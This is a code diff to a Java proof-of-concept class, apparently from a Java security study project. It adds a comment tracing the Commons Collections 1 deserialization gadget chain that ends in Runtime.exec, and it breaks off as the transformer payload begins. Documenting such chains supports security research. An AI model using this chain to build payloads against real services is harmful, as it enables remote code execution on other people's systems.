@@ -10,6 +10,31 @@ import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
+
+/**
+ * exec:347, Runtime (java.lang)
+ * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+ * invoke:62, NativeMethodAccessorImpl (sun.reflect)
+ * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+ * invoke:497, Method (java.lang.reflect)
+ * transform:126, InvokerTransformer (org.apache.commons.collections.functors)
+ * transform:123, ChainedTransformer (org.apache.commons.collections.functors)
+ * get:158, LazyMap (org.apache.commons.collections.map)
+ * invoke:77, AnnotationInvocationHandler (sun.reflect.annotation)
+ * entrySet:-1, $Proxy0 (com.sun.proxy)
+ * readObject:444, AnnotationInvocationHandler (sun.reflect.annotation)
+ * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+ * invoke:62, NativeMethodAccessorImpl (sun.reflect)
+ * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+ * invoke:497, Method (java.lang.reflect)
+ * invokeReadObject:1058, ObjectStreamClass (java.io)
+ * readSerialData:1900, ObjectInputStream (java.io)
+ * readOrdinaryObject:1801, ObjectInputStream (java.io)
+ * readObject0:1351, ObjectInputStream (java.io)
+ * readObject:371, ObjectInputStream (java.io)
+ * unserialize:110, SerializeUtils (com.javasec.utils)
+ * main:34, CommonsCollections1 (com.javasec.pocs.cc)
+ */
 public class CommonsCollections1 {
     public static void main(String[] args) throws Exception {
         Transformer[] transformers=new Transformer[]{
